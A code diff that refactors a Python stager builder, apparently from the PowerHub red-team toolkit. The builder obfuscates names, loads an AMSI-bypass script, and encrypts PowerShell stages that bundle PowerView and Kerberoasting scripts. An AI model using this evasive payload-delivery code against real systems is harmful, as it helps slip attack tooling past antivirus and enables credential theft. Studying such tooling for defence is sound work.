@@ -21,7 +21,7 @@ def choose_obfuscated_name():
     # detectable. they should also not be too common or we will risk
     # collisions. they should just blend in perfectly.
     result = None
-    length = random.choice(range(4,8))
+    length = random.choice(range(4, 8))
     while not result and result in list(symbol_list.values()):
         result = ''.join([random.choice(string.ascii_lowercase)
                           for i in range(length)])
@@ -32,26 +32,25 @@ def choose_obfuscated_name():
 # TODO add jinja include_randomize_whitespace
 # TODO add jinja powershell decoys
 
-def get_stager(key, amsibypass='reflection', stage3_templates=[],
-               stage3_files=[], stage3_strings=[]):
+def get_stage(key, amsi_bypass='reflection', stage3_files=[], stage3_strings=[]):
     from jinja2 import Environment, FileSystemLoader
 
     from powerhub.tools import encrypt_rc4, encrypt_aes
     from powerhub.directories import BASE_DIR
 
-    if amsibypass:
-        assert '/' not in amsibypass
-        amsibypass = os.path.join('powershell', 'amsi', amsibypass + '.ps1')
+    if amsi_bypass:
+        assert '/' not in amsi_bypass
+        amsi_bypass = os.path.join('powershell', 'amsi', amsi_bypass + '.ps1')
 
     context = {
         'key': key,
-        'amsibypass': amsibypass,
+        'amsibypass': amsi_bypass,
         'symbol_name': symbol_name,
         'full': True,
     }
 
     env = Environment(loader=FileSystemLoader(
-        os.path.join(BASE_DIR, 'powerhub', 'templates')
+        os.path.join(BASE_DIR, 'templates')
     ))
 
     def rc4encrypt(msg):
@@ -67,11 +66,8 @@ def get_stager(key, amsibypass='reflection', stage3_templates=[],
     stage2 = base64.b64encode(stage2).decode()
 
     stage3 = []
-    for t in stage3_templates + stage3_files + stage3_strings:
-        if t in stage3_templates:
-            t = env.get_template(os.path.join('powershell', t))
-            buffer = t.render(**context)
-        elif t in stage3_files:
+    for t in stage3_files + stage3_strings:
+        if t in stage3_files:
             buffer = open(t, 'r').read()
         else:
             buffer = t
@@ -104,7 +100,7 @@ def remove_blank_lines(text):
 
 
 if __name__ == "__main__":
-    print(get_stager('e97f6QqB6LIsjjbdum', stage3_files=[
+    print(get_stage('e97f6QqB6LIsjjbdum', stage3_files=[
         '/home/avollmer/git/PowerSploit/Recon/PowerView.ps1',
         '/home/avollmer/git/Get-KerberoastHash.ps1',
     ]))
